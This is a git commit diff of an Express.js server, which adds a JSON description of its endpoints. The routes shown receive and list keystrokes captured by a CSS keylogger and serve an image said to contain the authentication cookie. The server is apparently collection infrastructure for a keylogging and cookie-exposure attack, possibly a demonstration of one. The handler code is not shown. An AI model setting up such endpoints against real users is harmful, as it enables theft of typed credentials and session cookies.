0acfb09fdf246219b71139545937342260e4d0b8
Mojtaba Izadmehr <mojtaba.izadmehr@new10.com>
2020-10-22 03:47:13 +0200

    add description of endpoints

--- app/server.js
+++ app/server.js
@@ -1,26 +1,32 @@
 const express = require("express");
 const cookieParser = require("cookie-parser");
-var cors = require('cors')
+var cors = require("cors");
 
-const cookieImageHandler = require('./routes/cookie-image')
-const cssKeyLoggerAddKeyHandler = require('./routes/css-keylogger/addKey')
-const cssKeyLoggerGetKeysHandler = require('./routes/css-keylogger/getKeys')
+const cookieImageHandler = require("./routes/cookie-image");
+const cssKeyLoggerAddKeyHandler = require("./routes/css-keylogger/addKey");
+const cssKeyLoggerGetKeysHandler = require("./routes/css-keylogger/getKeys");
 
 const app = express();
-app.use(cors())
+app.use(cors());
 
 app.use(cookieParser());
-app.use('/static', express.static('public'))
+app.use("/static", express.static("public"));
 const port = process.env.PORT || 8080;
 
 app.get("/", (req, res) => {
-  res.send("Use to get /image.png to get an image!");
+  res.json({
+    endpoints: {
+      "/css-keylogger/add-key": "add keylogger stroke",
+      "/css-keylogger/keys": "list of entered keys with css keylogger",
+      "/image.png":
+        "get a sample image containing the authentication cookie",
+    },
+  });
 });
 
 app.get("/image.png", cookieImageHandler);
 app.get("/css-keylogger/add-key", cssKeyLoggerAddKeyHandler);
 app.get("/css-keylogger/keys", cssKeyLoggerGetKeysHandler);
-
 
 app.listen(port, () => {
   console.log(`Example app listening at http://localhost:${port}`);
